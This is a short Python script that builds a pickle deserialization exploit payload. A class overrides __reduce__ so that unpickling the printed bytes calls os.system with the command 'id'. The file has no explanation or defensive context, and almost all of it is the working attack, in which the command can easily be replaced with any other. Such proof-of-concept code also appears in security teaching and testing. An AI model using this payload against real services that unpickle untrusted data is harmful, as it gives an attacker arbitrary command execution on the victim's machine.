import pickle

class GNAT:
	def __reduce__(self):
		import os
		return(os.system, ('id',))

serialized = pickle.dumps(GNAT())

print(serialized);